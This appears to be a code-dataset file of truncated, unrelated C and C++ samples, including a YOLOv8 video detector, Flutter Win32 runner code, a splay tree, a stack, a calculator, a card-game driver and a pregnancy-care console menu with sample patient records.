imagePathList;\n    bool isVideo{false};\n    bool isCamera{false};\n\n    // Create an instance of the YOLOv8 object detector\n    auto yolov8 = new YOLOv8(engine_file_path);\n    yolov8->make_pipe(true);\n\n    // Process based on input type\n    if (input_type == \"video\") {\n        assert(argc == 6);\n        input_value = argv[3];\n        infer_rate = std::stoi(argv[4]);\n        output_type = argv[5];\n        if (IsFile(input_value)) {\n            std::string suffix = input_value.substr(input_value.find_last_of('.') + 1);\n            // Check if the input video file has a supported format\n            if (suffix == \"mp4\" || suffix == \"avi\" || suffix == \"m4v\" || suffix == \"mpeg\" || suffix == \"mov\" || suffix == \"mkv\") {\n                isVideo = true;\n            } else {\n                printf(\"suffix %s is wrong !!!\\n\", suffix.c_str());\n                std::abort();\n            }\n        }\n    } else if (input_type == \"camera\") {\n        assert(argc == 5);\n        infer_rate = std::stoi(argv[3]);\n        output_type = argv[4];\n        isCamera = true;\n    }\n\n    // Initialize OpenCV video capture and video writer\n    cv::VideoCapture cap;\n    cv::VideoWriter writer;\n    if (isVideo) {\n        cap.open(input_value);\n        if (!cap.isOpened()) {\n            printf(\"can not open %s\\n\", input_value.c_str());\n            return -1;\n        }\n\n        // Get video frame size\n        cv::Size size = cv::Size((int)cap.get(cv::CAP_PROP_FRAME_WIDTH), (int)cap.get(cv::CAP_PROP_FRAME_HEIGHT));\n        if (output_type == \"save\") {\n            // Generate a new filename for the output video\n            auto t = std::time(nullptr);\n            auto tm = *std::localtime(&t);\n            std::ostringstream oss;\n            oss << std::put_time(&tm, \"%Y-%m-%d_%H-%M-%S\");\n            auto str = oss.str();\n            size_t lastindex = input_value.find_last_of(\".\");\n            size_t lastSlash = input_value.find_last_of('/');\n            size_t lastDot = input_value.find_last_of('.');\n            std::string rawname = input_value.substr(lastSlash + 1, lastDot - lastSlash - 1);\n            std::string new_filename = rawname + \"_detection_\" + str + \".mp4\";\n            writer.open(new_filename, cv::VideoWriter::fourcc('m', 'p', '4', 'v'), 30, size);\n        }\n    } else {\n        // Settings for camera input\n        int capture_width = 1280;\n        int capture_height = 720;\n        int display_width = 1280;\n        int display_height = 720;\n        int framerate = 30;\n        int flip_method = 2;\n\n        // Generate the GStreamer pipeline string\n        std::string pipeline = gstreamer_pipeline(capture_width, capture_height, display_width, display_height, framerate, flip_method);\n        std::cout << \"Using pipeline: \\n\\t\" << pipeline << \"\\n\";\n\n        // Open the camera using the GStreamer pipeline\n        cap.open(pipeline, cv::CAP_GSTREAMER);\n        if (!cap.isOpened()) {\n            std::cout << \"Failed to open camera.\" << std::endl;\n            return -1;\n        }\n\n        // Get camera frame size\n        cv::Size size = cv::Size((int)cap.get(cv::CAP_PROP_FRAME_WIDTH), (int)cap.get(cv::CAP_PROP_FRAME_HEIGHT));\n        if (output_type == \"save\") {\n            // Generate a new filename for the output video\n            auto t = std::time(nullptr);\n            auto tm = *std::localtime(&t);\n            std::ostringstream oss;\n            oss << std::put_time(&tm, \"%Y-%m-%d_%H-%M-%S\");\n            auto str = oss.str();\n            size_t lastindex = input_value.find_last_of(\".\");\n            std::string rawname = input_value.substr(0, lastindex);\n            std::string new_filename = \"Camera_detection_\" + str + \".mp4\";\n            writer.open(new_filename, cv::VideoW",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n\nusing namespace std;\n\nstruct no {\n  int info;\n  no *ptr_proximo_no;\n};\n\nstruct pilha {\n  no *ptr_topo;\n\n  void inicializar(){\n    ptr_topo = NULL;\n  }\n\n  void empilhar(int nova_info) {\n    no *ptr_novo_no;\n    ptr_novo_no = new no;\n    \n    ptr_novo_no->info = nova_info;\n    ptr_novo_no->ptr_proximo_no = NULL;\n\n    if (ptr_topo == NULL) {\n      ptr_topo = ptr_novo_no;\n    } else {\n      // Ligando o pr\u00f3ximo do novo n\u00f3 ao antigo topo\n      ptr_novo_no->ptr_proximo_no = ptr_topo;\n      // Atualizando o no que ficar\u00e1 no topo\n      ptr_topo = ptr_novo_no;\n    }\n  }\n\n  void desempilhar() {\n    if (ptr_topo == NULL) {\n      return;\n    }\n\n    no *ptr_temp;\n    ptr_temp = ptr_topo;\n\n    ptr_topo = ptr_temp->ptr_proximo_no;\n    delete ptr_temp;\n  }\n\n  void imprimir() {\n    no *ptr_no_atual;\n    ptr_no_atual = ptr_topo;\n\n    while (ptr_no_atual != NULL) {\n      cout << ptr_no_atual->info << endl;\n      ptr_no_atual = ptr_no_atual->ptr_proximo_no;\n    }\n  }\n};\n\nint main() {\n  pilha minha_pilha;\n  minha_pilha.inicializar();\n  minha_pilha.empilhar(45);\n  minha_pilha.empilhar(32);\n  minha_pilha.empilhar(84);\n  minha_pilha.desempilhar();\n  minha_pilha.imprimir();\n}",
    "#ifdef __APPLE__\n\t#include \"Platform/MacOS/MacOSPlatform.hpp\"\n\n\t#include <CoreFoundation/CoreFoundation.h>\n\nnamespace util\n{\n/******************************************************************************\n *\n *****************************************************************************/\nMacOSPlatform::MacOSPlatform()\n{\n\t// This function ensures the working directory is set inside of the bundle if in production mode\n\tCFBundleRef mainBundle = CFBundleGetMainBundle();\n\tCFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);\n\tchar path[PATH_MAX];\n\tbool pathSet = CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, PATH_MAX);\n\n\t// This is a copy, so we release it here\n\tCFRelease(resourcesURL);\n\n\t// Actually do the check here\n\tif (pathSet)\n\t{\n\t\tstd::string pathStr = path;\n\t\tif (pathStr.find(\".app\") != std::string::npos)\n\t\t\tchdir(path);\n\t}\n}\n\n/******************************************************************************\n *\n *****************************************************************************/\nvoid MacOSPlatform::setIcon(const sf::WindowHandle& inHandle)\n{\n\tUNUSED(inHandle);\n}\n\n/******************************************************************************\n *\n *****************************************************************************/\nvoid MacOSPlatform::toggleFullscreen(const sf::WindowHandle& inHandle, const sf::Uint32 inStyle, const bool inWindowed, const sf::Vector2u& inResolution)\n{\n\tUNUSED(inHandle);\n\tUNUSED(inStyle);\n\tUNUSED(inWindowed);\n\tUNUSED(inResolution);\n}\n\n/******************************************************************************\n *\n *****************************************************************************/\nfloat MacOSPlatform::getScreenScalingFactor(const sf::WindowHandle& inHandle)\n{\n\tUNUSED(inHandle);\n\treturn 1.0f;\n}\n\n/******************************************************************************\n *\n *****************************************************************************/\nint MacOSPlatform::getRefreshRate(const sf::WindowHandle& inHandle)\n{\n\tUNUSED(inHandle);\n\treturn 59;\n}\n}\n\n#endif // __APPLE__",
    "#include \"iter.hpp\"\n\nint main()\n{\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST INT ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    int array[4] = {1, 2, 3, 4};\n    for(int i = 0; i < 4; i++)\n    {\n        std::cout << \"Here: \" << array[i] << std::endl;\n    }\n    iter(array, 4, increment);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for(int i = 0; i < 4; i++)\n    {\n        std::cout << \"Here: \" << array[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST DOUBLE ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    double doubleArray[] = {1.5, 2.5, 3.5, 4.5, 5.5};\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << doubleArray[i] << std::endl;\n    }\n    iter(doubleArray, 5, doubleNumber);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << doubleArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST FLOAT ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    float floatArray[] = {1.1f, 2.2f, 3.3f, 4.4f, 5.5f};\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << floatArray[i] << std::endl;\n    }\n    iter(floatArray, 5, square);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << floatArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST STRING ARRAY 1:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::string stringArray[] = {\"hello\", \"world\", \"how\", \"are\", \"you\"};\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n    iter(stringArray, 5, addExclamation);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST STRING ARRAY 2:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n    iter(stringArray, 5, capitalize);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string>\nusing namespace std;\n\nstruct DietPlan \n{\n    std::string description;\n};\n\n\nstruct ExercisePlan \n{\n    std::string description;\n};\n\nstruct Doctor \n{\n    std::string name;\n    std::string contactNumber;\n};\n\nstruct Patient \n{\n    std::string name;\n    std::string enrollmentDate;\n    std::string contactNumber;\n    std::string disease;\n    std::string pregnancyWeeks;\n    std::string height;\n    std::string weight;\n    Doctor attendingDoctor;\n};\n\nstruct EmergencyContacts\n{\n\tstd::string name;\n\tstd::string contactNumber;\n};\n\nvoid displayDoctors(const std::vector<Doctor>& doctors);\nvoid bookAppointment(const Doctor& doctor);\nvoid viewPatientInfo(const std::vector<Patient>& patients);\nvoid viewPatientInfoIndex(const std::vector<Patient>& patients, int patientChoice);\nvoid viewDietPlanForPregnancy();\nvoid displayEmergencyContacts(const std::vector<EmergencyContacts>& contacts);\n\nint main() \n{\n    std::vector<Doctor> nearbyDoctors;\n    nearbyDoctors.push_back({\"Dr. Khurana\", \"789-222-3333\"});\n    nearbyDoctors.push_back({\"Dr. Arora\", \"987-333-4444\"});\n    nearbyDoctors.push_back({\"Dr. Sharma\", \"986-444-5555\"});\n    nearbyDoctors.push_back({\"Dr. Menon\", \"777-444-5555\"});\n    nearbyDoctors.push_back({\"Dr. Rudra\", \"897-444-5555\"});\n    nearbyDoctors.push_back({\"Dr. Sneha\", \"888-444-5555\"});\n\n\n    std::vector<Patient> patients;\n    patients.push_back({\"Ishi Dikshit\", \"20-August-2023\", \"123-456-7890\", \"Thyroid\", \"8\", \"5.2\", \"160\", \"55\", {\"Dr. Khurana\", \"789-222-3333\"}});\n    patients.push_back({\"Rakshita Rudra\",\"22-April-2023\", \"987-654-3210\",\"N/A\", \"5\", \"165\", \"62\",{\"Dr. Sneha\", \"888-444-5555\"} });\n    patients.push_back({\"Anamika Mishra\",\"20-February-2023\", \"555-123-4567\",\"PCOD\",\"9\", \"155\", \"70\",{\"Dr. Sharma\", \"986-444-5555\"}});\n    patients.push_back({\"Diya Roy\", \"01-April-2023\", \"789-123-4567\",\"Diabetes\", \"4\", \"162\", \"68\",{\"Dr. Rudra\", \"897-444-5555\"}});\n    patients.push_back({\"Priya Sharma\",\"22-july-2023\", \"987-654-3210\",\"N/A\", \"7\", \"163\", \"60\",{\"Dr. Arora\", \"987-333-4444\"}});\n    patients.push_back({\"Himanshi Patel\",\"07-june-2023\", \"555-777-8888\",\"Hypertension\", \"2\", \"157\", \"65\",{\"Dr. Khurana\", \"789-222-3333\"} });\n    patients.push_back({\"Sneha Gupta\",\"21-August-2023\", \"123-987-6543\",\"Lactose intolrance\", \"5\", \"168\", \"58\",{\"Dr. Menon\", \"777-444-5555\"} });\n    patients.push_back({\"Sunena Singh\",\"20-january-2023\", \"777-555-9999\", \"N/A\", \"4\", \"170\", \"70\",{\"Dr. Khurana\", \"789-222-3333\"} });\n    patients.push_back({\"Anita Verma\",\"16-March-2023\", \"222-333-4444\", \"Hyperthyroid\", \"8\", \"155\", \"75\",{\"Dr. Arora\", \"987-333-4444\"} });\n    patients.push_back({\"Maithili Mehta\",\"16-March-2023\", \"444-555-6666\",\"N/A\", \"7\", \"161\", \"63\",{\"Dr. Rudra\", \"897-444-5555\"} });\n    patients.push_back({\"Pooja Malhotra\",\"18-September-2023\", \"555-444-3333\",\"Allergic to Root and tubers\", \"N/A\", \"166\", \"58\", {\"Dr. Menon\", \"777-444-5555\"}});\n    patients.push_back({\"Mitali Sharma\",\"29-September-2023\",\"123-987-6543\",\"N/A\", \"3\", \"159\", \"62\", {\"Dr. Rudra\", \"897-444-5555\"}});\n\n    std::vector<EmergencyContacts> contacts;\n    contacts.push_back({\"Apollo Hospitals\",\"1066\"});\n    contacts.push_back({\"Fortis Healthcare\",\"105010\"});\n    contacts.push_back({\"Emergency Ambulance Services\",\"108\"});\n    \n    \n    int choice;\n    int patientChoice;\n\n    do {\n        std::cout <<endl<< \"1. View patient information\\n\";\n        std::cout << \"2. View diet plan for pregnancy\\n\";\n        std::cout << \"3. View exercise plan\\n\";\n        std::cout << \"4. View nearby doctors\\n\";\n        std::cout << \"5. Book an appointment\\n\";\n        std::cout << \"6. View emergency contact numbers\\n\";\n        std::cout << \"7. Exit\\n\";\n        std::cout << \"Enter your choice: \";\n        std::cin >> choice;\n\n        switch (choice) \n\t\t{\n            case 1:\n                viewPatientInfo(patients);\n                break;\n            case 2:\n                viewDietPlanForPregnancy();\n                break;\n            case 3:\n               std::cout <<endl<< \"Your exercise plan for pregnant women: ...\\n\";\n               std::cout << \"---------------------------------------------------------------------------\\n\";\n               std::cout << \"Day 1: Gentle Cardio and Balance:\\n\";\n               std::cout << \"       - Morning: 20 minutes of prenatal walking or stationary cycling at a moderate pace\\n\";\n               std::cout << \"       - Afternoon: Balance exercises (standing on one leg, wall-supported squats) for 15 minutes\\n\";\n               std::cout << \"       - Evening: Prenatal yoga for relaxation and balance (15-20 minutes)\\n\";\n               std::cout << \"---------------------------------------------------------------------------\\n\";\n               std::cout << \"Day 2: Rest and Relaxation:\\n\";\n               std::cout << \"       - Focus on rest, relaxation, and deep breathing exercises\\n\";\n               std::cout << \"---------------------------------------------------------------------------\\n\";\n               std::cout << \"Day ",
    "#include \"win32_window.h\"\n\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n    FreeLibrary(user32_module);\n  }\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::CreateAndShow(const std::wstring& title,\n                                const Point& origin,\n                                const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW | WS_VISIBLE,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  return OnCreate();\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    SetWindowLongPtr(window, GWLP_USERDATA,\n                     reinterpret_cast<LONG_PTR>(window_struct->lpCreateParams));\n\n    auto that = static_cast<Win32Window*>(window_struct->lpCreateParams);\n    EnableFullDpiSupportIfAvailable(window);\n    that->window_handle_ = window;\n  } else if (Win32Window* that = GetThisFromHandle(window)) {\n    return that->MessageHandler(window, message, wparam, lparam);\n  }\n\n  return DefWindowProc(window, message, wparam, lparam);\n}\n\nLRESULT\nWin32Window::MessageHandler(HWND hwnd,\n                            UINT const message,\n                            WPARAM const wparam,\n                            LPARAM const lparam) noexcept {\n  switch (message) {\n    case WM_DESTROY:\n      window_handle_ = nullptr;\n      Destroy();\n      if (quit_on_close_) {\n        PostQuitMessage(0);\n  ",
    "#include <iostream>\n\nstruct Node {\n    friend class SplayTree;\n    Node *left = nullptr;\n    Node *right = nullptr;\n    Node *parent = nullptr;\n\npublic:\n    int key;\n\n    explicit Node(int key) {\n        this->key = key;\n    }\n\n    Node(int key, Node *parent) {\n        this->key = key;\n        this->parent = parent;\n    }\n\n    ~Node() {\n        delete left;\n        delete right;\n    }\n};\n\nclass SplayTree {\n    Node *root_ = nullptr;\n\n    int myMax(int first, int second) const {\n        return first > second ? first : second;\n    }\n\n    int getHeightRecursive(Node *root) const {\n        if (root == nullptr) {\n            return 0;\n        }\n        return myMax(getHeightRecursive(root->left), getHeightRecursive(root->right)) + 1;\n    }\n\n    void rightRotate(Node *pivot) {\n        // \u041f\u043e\u0432\u043e\u0440\u043e\u0442 \u043e\u0442\u043d\u043e\u0441\u0438\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u0435\u0440\u0448\u0438\u043d\u044b \u043d\u0430\u043f\u0440\u0430\u0432\u043e.\n        Node *next_left = pivot->left->right;\n\n        if (pivot->parent && pivot->parent->left == pivot) {\n            pivot->parent->left = pivot->left;\n        } else if (pivot->parent && pivot->parent->right == pivot) {\n            pivot->parent->right = pivot->left;\n        }\n        pivot->left->parent = pivot->parent;\n\n        pivot->parent = pivot->left;\n        pivot->parent->right = pivot;\n\n        pivot->left = next_left;\n        if (next_left) {\n            next_left->parent = pivot;\n        }\n    }\n\n    void leftRotate(Node *pivot) {\n        // \u041f\u043e\u0432\u043e\u0440\u043e\u0442 \u043e\u0442\u043d\u043e\u0441\u0438\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u0435\u0440\u0448\u0438\u043d\u044b \u043d\u0430\u043b\u0435\u0432\u043e.\n        Node *next_right = pivot->right->left;\n\n        if (pivot->parent && pivot->parent->left == pivot) {\n            pivot->parent->left = pivot->right;\n        } else if (pivot->parent && pivot->parent->right == pivot) {\n            pivot->parent->right = pivot->right;\n        }\n        pivot->right->parent = pivot->parent;\n\n        pivot->parent = pivot->right;\n        pivot->parent->left = pivot;\n\n        pivot->right = next_right;\n        if (next_right) {\n            next_right->parent = pivot;\n        }\n    }\n\npublic:\n    SplayTree() {\n    }\n\n    ~SplayTree() {\n        delete root_;\n    }\n\n    void insert(int key) {\n        if (root_ == nullptr) {\n            root_ = new Node(key);\n            return;\n        }\n\n        Node *curr = root_;\n        bool node_inserted = false;\n        while (!node_inserted) {\n            if (key < curr->key) {\n                if (curr->left == nullptr) {\n                    curr->left = new Node(key, curr);\n                    curr = curr->left;\n                    node_inserted = true;\n                } else {\n                    curr = curr->left;\n                }\n            } else if (key > curr->key) {\n                if (curr->right == nullptr) {\n                    curr->right = new Node(key, curr);\n                    curr = curr->right;\n                    node_inserted = true;\n                } else {\n                    curr = curr->right;\n                }\n            } else {\n                node_inserted = true;\n            }\n        }\n        splay(curr);\n    }\n\n    Node *find(int key) const {\n        Node *curr = root_;\n        while (curr != nullptr) {\n            if (key < curr->key) {\n                curr = curr->left;\n            } else if (key > curr->key) {\n                curr = curr->right;\n            } else {\n                return curr;\n            }\n        }\n        return nullptr;\n    }\n\n    int splay(Node *node_goes_up) {\n        int rotations_number = 0;\n\n        if (node_goes_up == root_) {\n            return rotations_number;\n        }\n\n        Node *curr = node_goes_up;\n\n        while (curr->parent) {\n            if (!curr->parent->parent) {\n                if (curr == curr->parent->left) {\n                    // \u041c\u0430\u043b\u044b\u0439 \u043f\u0440\u0430\u0432\u044b\u0439 \u043f\u043e\u0432\u043e\u0440\u043e\u0442.\n                    rightRotate(curr->parent);\n                } else {\n                    // \u041c\u0430\u043b\u044b\u0439 \u043b\u0435\u0432\u044b\u0439 \u043f\u043e\u0432\u043e\u0440\u043e\u0442.\n                    leftRotate(curr->parent);\n                }\n                ++rotations_number;\n            } else if (curr == curr->parent->left && curr->parent == curr->parent->parent->left) {\n                // \u0414\u0432\u0430 \u043f\u0440\u0430\u0432\u044b\u0445 \u043f\u043e\u0432\u043e\u0440\u043e\u0442\u0430.\n                rightRotate(curr->parent->parent);\n                rightRotate(curr->parent);\n                rotations_number += 2;\n            } else if (curr == curr->parent->right && curr->parent == curr->parent->parent->right) {\n                // \u0414\u0432\u0430 \u043b\u0435\u0432\u044b\u0445 \u043f\u043e\u0432\u043e\u0440\u043e\u0442\u0430.\n                leftRotate(curr->parent->parent);\n                leftRotate(curr->parent);\n                rotations_number += 2;\n            } else if (curr == curr->parent->right && curr->parent == curr->parent->parent->left) {\n                // \u0411\u043e\u043b\u044c\u0448\u043e\u0439 \u043f\u0440\u0430\u0432\u044b\u0439 \u043f\u043e\u0432\u043e\u0440\u043e\u0442.\n                leftRotate(curr->parent);\n                rightRotate(curr->parent);\n                ++rotations_number;\n            } else {\n                // \u0411\u043e\u043b\u044c\u0448\u043e\u0439 \u043b\u0435\u0432\u044b\u0439 \u043f\u043e\u0432\u043e\u0440\u043e\u0442.\n                rightRotate(curr->parent);\n                leftRotate(curr->parent);\n                ++rotations_number;\n            }\n        }\n        root_ = curr;\n        return rotations_number;\n    }\n};\n\nint main() {\n    Spla",
    "#include<stdio.h>\nvoid funcmul(int*,int*,int*);\nvoid funcdiv(int*,int*,int*);\nvoid funcadd(int*,int*,int*);\nvoid funcsub(int*,int*,int*);\nint main()\n{\n    int mul,sub,div,add;\n     int n1,n2;\n     char op;\n     printf(\"Enter your  first Number :\\n\");\n     scanf(\"%d\",&n1);\n      printf(\"Enter The Operator(*,-,+,/):\\n\");\n     scanf(\" %c\",&op);\n     printf(\"Enter your Second Number:\\n\");\n     scanf(\"%d\",&n2);\n\n\n     if(op=='*'){\n        funcmul(&n1,&n2,&mul);\n        printf(\"Multiplication=%d\",mul);\n        return 0;\n     }if(op=='/'){\n       funcdiv(&n1,&n2,&div);\n         printf(\"Division=%d\",div);\n         return 0;\n     }if(op=='+'){\n      funcadd(&n1,&n2,&add);\n        printf(\"Addition=%d\",add);\n        return 0;\n     }if(op=='-'){\n      funcsub(&n1,&n2,&sub);\n        printf(\"Subtraction=%d\",sub);\n        return 0;\n     }else{\n       printf(\"Invalid\");\n       return 0;\n     }\n\n}\nvoid funcmul(int* n1,int* n2,int* mul){\n\n      *mul=*n1 * *n2;\n}\nvoid funcadd(int* n1,int* n2,int* add){\n\n      *add=*n1 + *n2;\n}\n\nvoid funcsub(int* n1,int* n2,int* sub){\n\n      *sub=*n1 - *n2;\n}\n\nvoid funcdiv(int* n1,int* n2,int* div){\n\n      *div=*n1 / *n2;\n}\n\n\n\n\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n\n#include \"cards.h\"\n#include \"utility.h\"\n\nusing namespace std;\n\nint main(int argv, char** argc){\n  if(argv < 3){\n    cout << \"Please provide 2 file names\" << endl;\n    return 1;\n  }\n  \n  ifstream cardFile1 (argc[1]);\n  ifstream cardFile2 (argc[2]);\n  string line;\n\n  // Create Alice and Bob BST\n  CardsBST alice;\n  CardsBST bob;\n  \n  // Read files\n  if (cardFile1.fail() || cardFile2.fail() ){\n    cout << \"Could not open file \" << argc[2];\n    return 1;\n  }\n\n  // Read Alice file\n  while (getline (cardFile1, line) && (line.length() > 0)){\n      Card a = getCard(line);\n      alice.insert(a);\n  }\n  cardFile1.close();\n\n  // Read Bob file\n  while (getline (cardFile2, line) && (line.length() > 0)){\n      Card b = getCard(line);\n      bob.insert(b);\n  }\n  cardFile2.close();\n\n  // Create Alice and Bob final BST\n  CardsBST bob_final;\n  CardsBST alice_final;\n  CardsBST matching_card;\n\n  // start of the game\n  const int cpt_end_alice = alice.count() + 1; // number of card of each player\n  const int cpt_end_bob = bob.count() + 1;\n  int cpt_alice = 1;\n  int cpt_bob = 